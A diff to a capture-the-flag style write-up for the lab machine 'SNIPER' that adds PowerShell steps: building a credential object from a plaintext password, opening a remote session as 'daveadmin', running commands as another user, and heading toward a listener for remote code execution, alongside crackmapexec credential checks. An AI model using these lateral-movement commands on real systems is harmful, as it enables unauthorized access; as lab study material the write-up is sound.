@@ -10,6 +10,23 @@ First of all let's confirm that those creds are working, utilizing crackmapexec
 crackmapexec smb 10.129.229.6 -u chris -p '36mEAhz/B8xQ~2VM'
 ```
 
+## Creating Credential Object and logging into different user
+
+```
+$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
+```
+```
+$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
+```
+
+Logging in
+
+```
+Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
+```
+
+
+
 ## Create Credential Object
 
 ```
@@ -17,12 +34,16 @@ $password = convertto-securestring -AsPlainText -Force -String "36mEAhz/B8xQ~2VM
 $credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\chris",$password;
 ```
 
+## Command Execution
+
 Running the following command prompted us with an working command.
 
 ```
 Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -credential $credential;
 sniper\chris
 ```
+
+## RCE
 
 Started up listener on port 8888
 
